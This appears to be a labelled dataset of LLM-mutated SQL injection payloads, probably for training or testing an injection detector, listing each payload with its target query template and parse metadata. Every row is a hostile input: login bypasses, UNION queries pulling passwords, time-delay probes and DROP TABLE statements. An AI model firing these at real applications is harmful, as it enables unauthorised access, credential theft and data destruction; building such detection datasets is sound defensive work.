attack_category,template_context,payload,full_query,label,source,generator_model,mutation_count,original_payload,failure_stage,is_valid_syntax,winning_context_index,winning_dialect,tables,columns,literal_types,select_arm_widths,node_set,Query
union_based,login,' OR username='admin' AND password IS NULL--,SELECT * FROM users WHERE username = '' OR username='admin' AND password IS NULL--' AND password = 'anything',1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,1'/**/OR/**/username/**/=/**/'admin'/**/AND/**/password/**/=/**/NULL/*,judge,True,2,default,"[""users""]","[""name"", ""username"", ""password""]","[""TEXT"", ""TEXT"", ""TEXT""]",[],"[""And"", ""Column"", ""EQ"", ""From"", ""Identifier"", ""Is"", ""Literal"", ""Null"", ""Or"", ""Select"", ""Star"", ""Table"", ""Where""]",' OR username='admin' AND password IS NULL--
union_based,login,') UNION SELECT username FROM (SELECT username FROM users ORDER BY username LIMIT 1 OFFSET 0);--,SELECT * FROM users WHERE username = '') UNION SELECT username FROM (SELECT username FROM users ORDER BY username LIMIT 1 OFFSET 0);--' AND password = 'anything',1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,'%' LIKE '%' AND (SELECT username FROM (SELECT username FROM users ORDER BY username LIMIT 1 OFFSET 0))#,sandbox,True,6,default,"[""users""]","[""username"", ""name""]","[""TEXT"", ""INTEGER""]","[1, 1]","[""Column"", ""EQ"", ""From"", ""Identifier"", ""Limit"", ""Literal"", ""Offset"", ""Order"", ""Ordered"", ""Paren"", ""Select"", ""Semicolon"", ""Star"", ""Subquery"", ""Table"", ""Union"", ""Where""]",') UNION SELECT username FROM (SELECT username FROM users ORDER BY username LIMIT 1 OFFSET 0);--
union_based,login,"--) UNION SELECT username, password FROM admins","SELECT * FROM users WHERE username = '--) UNION SELECT username, password FROM admins' AND password = 'anything'",1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,"') UNION ALL SELECT username, password FROM admins--",sandbox,True,0,default,[],[],[],[],[],"--) UNION SELECT username, password FROM admins"
union_based,search,' OR WAITFOR DELAY '0:0:5''--,SELECT * FROM products WHERE name LIKE '%' OR WAITFOR DELAY '0:0:5''--%',1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,'; WAITFOR DELAY '0:0:10'; --,judge,False,-1,,[],[],[],[],[],' OR WAITFOR DELAY '0:0:5''--
union_based,user_lookup,") UNION SELECT username, email FROM users --","SELECT * FROM users WHERE id = ) UNION SELECT username, email FROM users --",1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,;WAITFOR DELAY '0:0:10' --,judge,True,5,default,"[""users""]","[""name""]","[""TEXT""]",[],"[""Column"", ""EQ"", ""From"", ""Identifier"", ""Literal"", ""Select"", ""Star"", ""Table"", ""Where""]",") UNION SELECT username, email FROM users --"
union_based,user_lookup,";) UNION SELECT username, role FROM users;","SELECT * FROM users WHERE id = ;) UNION SELECT username, role FROM users;",1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,"; WAITFOR DELAY '0:0:5' UNION ALL SELECT NULL, NULL, NULL, NULL",judge,True,5,default,"[""users""]","[""name""]","[""TEXT""]",[],"[""Column"", ""EQ"", ""From"", ""Identifier"", ""Literal"", ""Select"", ""Star"", ""Table"", ""Where""]",";) UNION SELECT username, role FROM users;"
union_based,user_lookup,) AND username >= CHAR(97),SELECT * FROM users WHERE id = ) AND username >= CHAR(97),1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,"/* OR '1'*/' OR ASCII(SUBSTRING(username,1,1))>ASCII('a')-1",judge,True,5,default,"[""users""]","[""name""]","[""TEXT""]",[],"[""Column"", ""EQ"", ""From"", ""Identifier"", ""Literal"", ""Select"", ""Star"", ""Table"", ""Where""]",) AND username >= CHAR(97)
union_based,user_lookup,--/**/ OR '1'='1,SELECT * FROM users WHERE id = --/**/ OR '1'='1,1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,/**/ OR /**/'1'='1,judge,True,0,default,[],[],[],[],[],--/**/ OR '1'='1
union_based,order_filter,(SELECT 1 FROM users WHERE username = '') OR 1=1,SELECT * FROM orders WHERE status = '(SELECT 1 FROM users WHERE username = '') OR 1=1' ORDER BY date DESC,1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,(CASE WHEN (SELECT 1 FROM users WHERE username = '') THEN 1 ELSE 0 END),sandbox,True,0,default,"[""users""]","[""username""]","[""INTEGER""]",[],"[""Column"", ""EQ"", ""From"", ""Identifier"", ""Literal"", ""Or"", ""Select"", ""Subquery"", ""Table"", ""Where""]",(SELECT 1 FROM users WHERE username = '') OR 1=1
union_based,order_filter,' OR 1=1;,SELECT * FROM orders WHERE status = '' OR 1=1;' ORDER BY date DESC,1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,'; DROP TABLE IF EXISTS temp_table; SELECT * FROM orders WHERE status = ',sandbox,True,2,default,"[""users""]","[""name""]","[""TEXT""]",[],"[""Column"", ""EQ"", ""From"", ""Identifier"", ""Literal"", ""Or"", ""Select"", ""Star"", ""Table"", ""Where""]",' OR 1=1;
union_based,comment_insert,' OR 1=1 --),"INSERT INTO comments (user_id, body) VALUES (1, '' OR 1=1 --)')",1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,"1' UNION ALL SELECT username, password FROM users --",sandbox,True,2,default,"[""users""]","[""name""]","[""TEXT""]",[],"[""Column"", ""EQ"", ""From"", ""Identifier"", ""Literal"", ""Or"", ""Select"", ""Star"", ""Table"", ""Where""]",' OR 1=1 --)
union_based,comment_insert,*/ WAITFOR DELAY '0:0:3' OR 1=1 --),"INSERT INTO comments (user_id, body) VALUES (1, '*/ WAITFOR DELAY '0:0:3' OR 1=1 --)')",1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,"'; WAITFOR DELAY '0:0:3' UNION SELECT CONCAT(username, password) AS credentials FROM auth.users --",judge,False,-1,,[],[],[],[],[],*/ WAITFOR DELAY '0:0:3' OR 1=1 --)
blind_boolean,login,' AND password LIKE 'A%'--,SELECT * FROM users WHERE username = '' AND password LIKE 'A%'--' AND password = 'anything',1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,"\' AND ASCII(SUBSTRING(password,1,1))>100 --""",sandbox,True,2,default,"[""users""]","[""name"", ""password""]","[""TEXT"", ""TEXT""]",[],"[""And"", ""Column"", ""EQ"", ""From"", ""Identifier"", ""Like"", ""Literal"", ""Select"", ""Star"", ""Table"", ""Where""]",' AND password LIKE 'A%'--
blind_boolean,login,' OR username LIKE 'A%'#,SELECT * FROM users WHERE username = '' OR username LIKE 'A%'#' AND password = 'anything',1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,"' AND (ASCII(SUBSTR(username,1,1))=65)#",sandbox,True,2,mysql,"[""users""]","[""name"", ""username""]","[""TEXT"", ""TEXT""]",[],"[""Column"", ""EQ"", ""From"", ""Identifier"", ""Like"", ""Literal"", ""Or"", ""Select"", ""Star"", ""Table"", ""Where""]",' OR username LIKE 'A%'#
blind_boolean,search,'; WAITFOR DELAY '00:00:10' AND 1=1;,SELECT * FROM products WHERE name LIKE '%'; WAITFOR DELAY '00:00:10' AND 1=1;%',1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,1'; WAITFOR DELAY '00:00:10'--,judge,False,-1,,[],[],[],[],[],'; WAITFOR DELAY '00:00:10' AND 1=1;
blind_boolean,search,' OR (username LIKE '%A%' AND user_id IN (SELECT user_id FROM admin));,SELECT * FROM products WHERE name LIKE '%' OR (username LIKE '%A%' AND user_id IN (SELECT user_id FROM admin));%',1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,' OR 1=1 /*,judge,True,2,default,"[""users"", ""admin""]","[""name"", ""username"", ""user_id""]","[""TEXT"", ""TEXT"", ""TEXT""]",[],"[""And"", ""Column"", ""EQ"", ""From"", ""Identifier"", ""In"", ""Like"", ""Literal"", ""Or"", ""Paren"", ""Select"", ""Star"", ""Subquery"", ""Table"", ""Where""]",' OR (username LIKE '%A%' AND user_id IN (SELECT user_id FROM admin));
blind_boolean,search,' OR (password LIKE '%A%' AND user_type = 'admin');,SELECT * FROM products WHERE name LIKE '%' OR (password LIKE '%A%' AND user_type = 'admin');%',1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,' OR 1=1 /\*,judge,True,2,default,"[""users""]","[""name"", ""password"", ""user_type""]","[""TEXT"", ""TEXT"", ""TEXT""]",[],"[""And"", ""Column"", ""EQ"", ""From"", ""Identifier"", ""Like"", ""Literal"", ""Or"", ""Paren"", ""Select"", ""Star"", ""Table"", ""Where""]",' OR (password LIKE '%A%' AND user_type = 'admin');
blind_boolean,user_lookup,; WAITFOR DELAY '0:0:5' --,SELECT * FROM users WHERE id = ; WAITFOR DELAY '0:0:5' --,1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,; IF (SELECT COUNT(*) FROM (SELECT 1 WHERE 1=1)) > 0 THEN WAITFOR DELAY '0:0:5'; END;,judge,False,-1,,[],[],[],[],[],; WAITFOR DELAY '0:0:5' --
blind_boolean,comment_insert,; WAITFOR DELAY '0:0:5' --,"INSERT INTO comments (user_id, body) VALUES (1, '; WAITFOR DELAY '0:0:5' --')",1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,'; WAITFOR DELAY '0:0:5' --,judge,False,-1,,[],[],[],[],[],; WAITFOR DELAY '0:0:5' --
blind_boolean,comment_insert,"-32767 OR ASCII(SUBSTRING(password, 1, 1)) = 97","INSERT INTO comments (user_id, body) VALUES (1, '-32767 OR ASCII(SUBSTRING(password, 1, 1)) = 97')",1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,"-32767\"" AND SUBSTRING((SELECT password FROM users LIMIT 1), 1, 1) = 'a'""",sandbox,True,0,default,[],"[""password""]","[""INTEGER""]",[],"[""Ascii"", ""Column"", ""EQ"", ""Identifier"", ""Literal"", ""Neg"", ""Or"", ""Substring""]","-32767 OR ASCII(SUBSTRING(password, 1, 1)) = 97"
blind_time,order_filter,-- WAITFOR DELAY '0:0:5';,SELECT * FROM orders WHERE status = '-- WAITFOR DELAY '0:0:5';' ORDER BY date DESC,1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,"""; WAITFOR DELAY '0:0:5'; --",judge,True,0,default,[],[],[],[],[],-- WAITFOR DELAY '0:0:5';
blind_time,order_filter,- WAITFOR DELAY '0:0:4';,SELECT * FROM orders WHERE status = '- WAITFOR DELAY '0:0:4';' ORDER BY date DESC,1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,'; WAITFOR DELAY '0:0:4'; UNION ALL --,judge,False,-1,,[],[],[],[],[],- WAITFOR DELAY '0:0:4';
blind_time,comment_insert,- WAITFOR DELAY '0:0:3' AND 1=1,"INSERT INTO comments (user_id, body) VALUES (1, '- WAITFOR DELAY '0:0:3' AND 1=1')",1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,/*' OR 3<>3=(WAITFOR DELAY '0:0:3' AND 1=1)--*/',judge,False,-1,,[],[],[],[],[],- WAITFOR DELAY '0:0:3' AND 1=1
stacked_queries,login,') WAITFOR DELAY '0:0:10';--,SELECT * FROM users WHERE username = '') WAITFOR DELAY '0:0:10';--' AND password = 'anything',1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,"; WAITFOR DELAY '0:0:10';--""",judge,False,-1,,[],[],[],[],[],') WAITFOR DELAY '0:0:10';--
comment_obfuscation,login,";-- ""
DB_NAME() LIKE '%temp%'
--""","SELECT * FROM users WHERE username = ';-- ""
DB_NAME() LIKE '%temp%'
--""' AND password = 'anything'",1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,"OR -- "" + String.fromCharCode(13) + String.fromCharCode(10) + "" DB_NAME() LIKE '%temp%' --""",sandbox,True,0,default,[],[],[],[],"[""Anonymous"", ""Like"", ""Literal"", ""Semicolon""]",";-- ""
DB_NAME() LIKE '%temp%'
--"""
comment_obfuscation,login,-- OR (SELECT UPPER(SUBSTRING(name FROM sysdatabases ORDER BY dbid ASC LIMIT 1)) FROM users WHERE username = '') = 'M',SELECT * FROM users WHERE username = '-- OR (SELECT UPPER(SUBSTRING(name FROM sysdatabases ORDER BY dbid ASC LIMIT 1)) FROM users WHERE username = '') = 'M'' AND password = 'anything',1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,"OR (SELECT UPPER(SUBSTRING((SELECT name FROM master..sysdatabases ORDER BY dbid LIMIT 1), 1, 1)) FROM users WHERE username = ''' ) = 'M'/*""",judge,True,0,default,[],[],[],[],[],-- OR (SELECT UPPER(SUBSTRING(name FROM sysdatabases ORDER BY dbid ASC LIMIT 1)) FROM users WHERE username = '') = 'M'
comment_obfuscation,login,"-- OR ASCII(SUBSTRING(username,1,1)) < 97","SELECT * FROM users WHERE username = '-- OR ASCII(SUBSTRING(username,1,1)) < 97' AND password = 'anything'",1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,"/*\' OR \'a\'=\'a*/,1/(SELECT 0)#""",judge,True,0,default,[],[],[],[],[],"-- OR ASCII(SUBSTRING(username,1,1)) < 97"
comment_obfuscation,login,") OR ASCII(SUBSTRING(username,1,1)) < 97--","SELECT * FROM users WHERE username = ') OR ASCII(SUBSTRING(username,1,1)) < 97--' AND password = 'anything'",1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,"/*\' OR ASCII(SUBSTRING(username,1,1))<97#",judge,True,5,default,"[""users""]","[""name""]","[""TEXT""]",[],"[""Column"", ""EQ"", ""From"", ""Identifier"", ""Literal"", ""Select"", ""Star"", ""Table"", ""Where""]",") OR ASCII(SUBSTRING(username,1,1)) < 97--"
comment_obfuscation,search,-- OR '1' = '1',SELECT * FROM products WHERE name LIKE '%-- OR '1' = '1'%',1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,#' OR '1'='1',judge,True,0,default,[],[],[],[],[],-- OR '1' = '1'
comment_obfuscation,search,OR ('1' = '1')--,SELECT * FROM products WHERE name LIKE '%OR ('1' = '1')--%',1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,"\"" OR ('1'=\""1\"") --""",judge,True,1,default,"[""users""]",[],[],[],"[""EQ"", ""From"", ""Identifier"", ""Literal"", ""Or"", ""Paren"", ""Select"", ""Star"", ""Table"", ""Where""]",OR ('1' = '1')--
comment_obfuscation,search,-- OR LOWER('1') = LOWER('1'),SELECT * FROM products WHERE name LIKE '%-- OR LOWER('1') = LOWER('1')%',1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,#' OR LOWER('1') = LOWER('1'),judge,True,0,default,[],[],[],[],[],-- OR LOWER('1') = LOWER('1')
comment_obfuscation,user_lookup,-- OR SELECT * FROM users --,SELECT * FROM users WHERE id = -- OR SELECT * FROM users --,1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,1' /* OR */ SELECT 1,judge,True,0,default,[],[],[],[],[],-- OR SELECT * FROM users --
comment_obfuscation,order_filter,-- OR '1' --,SELECT * FROM orders WHERE status = '-- OR '1' --' ORDER BY date DESC,1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,/**/1'/*--,judge,True,0,default,[],[],[],[],[],-- OR '1' --
comment_obfuscation,order_filter,--1' OR (SELECT 1 FROM users WHERE role != 'admin'),SELECT * FROM orders WHERE status = '--1' OR (SELECT 1 FROM users WHERE role != 'admin')' ORDER BY date DESC,1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,#1' /* AND (SELECT 1 FROM users WHERE role != 'admin') */,judge,True,0,default,[],[],[],[],[],--1' OR (SELECT 1 FROM users WHERE role != 'admin')
comment_obfuscation,order_filter,#1' OR (SELECT 1 FROM products WHERE quantity > 0),SELECT * FROM orders WHERE status = '#1' OR (SELECT 1 FROM products WHERE quantity > 0)' ORDER BY date DESC,1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,/**/1'/* OR (SELECT 1 FROM products WHERE quantity > 0) --,judge,True,2,default,"[""users"", ""products""]","[""name"", ""quantity""]","[""TEXT"", ""INTEGER""]",[],"[""Column"", ""EQ"", ""From"", ""GT"", ""Identifier"", ""Literal"", ""Or"", ""Select"", ""Star"", ""Subquery"", ""Table"", ""Where""]",#1' OR (SELECT 1 FROM products WHERE quantity > 0)
comment_obfuscation,order_filter,1' OR (SELECT 1 FROM categories WHERE name ILIKE '%electronics%'),SELECT * FROM orders WHERE status = '1' OR (SELECT 1 FROM categories WHERE name ILIKE '%electronics%')' ORDER BY date DESC,1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,/**/1' OR (SELECT 1 FROM categories WHERE name LIKE '%electronics%'),judge,True,2,default,"[""users"", ""categories""]","[""name""]","[""TEXT""]",[],"[""Column"", ""EQ"", ""From"", ""ILike"", ""Identifier"", ""Literal"", ""Or"", ""Select"", ""Star"", ""Subquery"", ""Table"", ""Where""]",1' OR (SELECT 1 FROM categories WHERE name ILIKE '%electronics%')
comment_obfuscation,comment_insert,--1' OR (SELECT 1 FROM comments),"INSERT INTO comments (user_id, body) VALUES (1, '--1' OR (SELECT 1 FROM comments)')",1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,/**/1'/*OR*/1=1/**/,judge,True,0,default,[],[],[],[],[],--1' OR (SELECT 1 FROM comments)
comment_obfuscation,comment_insert,#1' OR (SELECT 1 FROM comments),"INSERT INTO comments (user_id, body) VALUES (1, '#1' OR (SELECT 1 FROM comments)')",1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,1' /*OR*/ 1=1 --,judge,True,2,default,"[""users"", ""comments""]","[""name""]","[""TEXT""]",[],"[""Column"", ""EQ"", ""From"", ""Identifier"", ""Literal"", ""Or"", ""Select"", ""Star"", ""Subquery"", ""Table"", ""Where""]",#1' OR (SELECT 1 FROM comments)
comment_obfuscation,comment_insert,' OR '1'='1' --,"INSERT INTO comments (user_id, body) VALUES (1, '' OR '1'='1' --')",1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,1' OR 1=1 /*--,judge,True,2,default,"[""users""]","[""name""]","[""TEXT""]",[],"[""Column"", ""EQ"", ""From"", ""Identifier"", ""Literal"", ""Or"", ""Select"", ""Star"", ""Table"", ""Where""]",' OR '1'='1' --
comment_obfuscation,comment_insert,"%27%20AND%20ASCII(SUBSTRING(password,%201,%201))=%2065%20--","INSERT INTO comments (user_id, body) VALUES (1, '%27%20AND%20ASCII(SUBSTRING(password,%201,%201))=%2065%20--')",1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,/**/ 1' --%0D%0A#,judge,True,5,default,"[""users""]","[""name""]","[""TEXT""]",[],"[""Column"", ""EQ"", ""From"", ""Identifier"", ""Literal"", ""Select"", ""Star"", ""Table"", ""Where""]","%27%20AND%20ASCII(SUBSTRING(password,%201,%201))=%2065%20--"
comment_obfuscation,comment_insert,; DROP TABLE comments --,"INSERT INTO comments (user_id, body) VALUES (1, '; DROP TABLE comments --')",1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,1' /*OR*/ (SELECT 1 FROM products WHERE price=0) --,judge,True,0,default,"[""comments""]",[],[],[],"[""Drop"", ""Identifier"", ""Table""]",; DROP TABLE comments --
encoding_obfuscation,login,"--
' OR 'a'='a' --""","SELECT * FROM users WHERE username = '--
' OR 'a'='a' --""' AND password = 'anything'",1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,"1\' AND ASCII(SUBSTRING(password, 1, 1)) = 65 --""",sandbox,True,2,default,"[""users""]","[""name""]","[""TEXT""]",[],"[""Column"", ""EQ"", ""From"", ""Identifier"", ""Literal"", ""Or"", ""Select"", ""Star"", ""Table"", ""Where""]","--
' OR 'a'='a' --"""
encoding_obfuscation,login,) OR (1=1 --,SELECT * FROM users WHERE username = ') OR (1=1 --' AND password = 'anything',1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,"1\' AND ASCII(SUBSTRING(username, 1, 1)) = 65 --",sandbox,True,5,default,"[""users""]","[""name""]","[""TEXT""]",[],"[""Column"", ""EQ"", ""From"", ""Identifier"", ""Literal"", ""Select"", ""Star"", ""Table"", ""Where""]",) OR (1=1 --
encoding_obfuscation,login,"' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) < 50 --","SELECT * FROM users WHERE username = '' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) < 50 --' AND password = 'anything'",1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,"1\' AND INET_NTOA(UNHEX(REPLACE(DATABASE(), ' ', ''))) LIKE '1%' --""",sandbox,True,2,mysql,"[""users""]","[""name""]","[""TEXT""]",[],"[""And"", ""Ascii"", ""Column"", ""CurrentSchema"", ""EQ"", ""From"", ""Identifier"", ""LT"", ""Literal"", ""Select"", ""Star"", ""Subquery"", ""Substring"", ""Table"", ""Where""]","' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) < 50 --"
encoding_obfuscation,search,; WAITFOR DELAY '0:0:5'; EXECUTE('DROP TABLE users')--,SELECT * FROM products WHERE name LIKE '%; WAITFOR DELAY '0:0:5'; EXECUTE('DROP TABLE users')--%',1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,%23--',sandbox,False,-1,,[],[],[],[],[],; WAITFOR DELAY '0:0:5'; EXECUTE('DROP TABLE users')--
encoding_obfuscation,search,%23 WAITFOR DELAY '0:0:5' %23 UNION SELECT NULL--,SELECT * FROM products WHERE name LIKE '%%23 WAITFOR DELAY '0:0:5' %23 UNION SELECT NULL--%',1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,%23WAITFOR%20DELAY%20'0:0:5'%20AND%20(CHAR(65)%20LIKE%20'%23'),judge,False,-1,,[],[],[],[],[],%23 WAITFOR DELAY '0:0:5' %23 UNION SELECT NULL--
encoding_obfuscation,search,"%23 UNION ALL SELECT NULL, NULL, NULL, NULL--","SELECT * FROM products WHERE name LIKE '%%23 UNION ALL SELECT NULL, NULL, NULL, NULL--%'",1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,"1%'%20UNION%20SELECT%20NULL,%20NULL,%20NULL,%20NULL%20FROM%20users--",judge,True,1,default,"[""users""]",[],[],"[1, 4]","[""EQ"", ""From"", ""Identifier"", ""Literal"", ""Mod"", ""Null"", ""Select"", ""Star"", ""Table"", ""Union"", ""Where""]","%23 UNION ALL SELECT NULL, NULL, NULL, NULL--"
encoding_obfuscation,search,. OR 1=1; --,SELECT * FROM products WHERE name LIKE '%. OR 1=1; --%',1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,1%2B'%'%20AS%20x%2BWHERE%20(SELECT%20SUM(id)%20FROM%20products)%20=%%20(SELECT%20SUM(id)%20FROM%20products),sandbox,True,5,default,"[""users""]","[""name""]","[""TEXT""]",[],"[""Column"", ""EQ"", ""From"", ""Identifier"", ""Literal"", ""Select"", ""Star"", ""Table"", ""Where""]",. OR 1=1; --
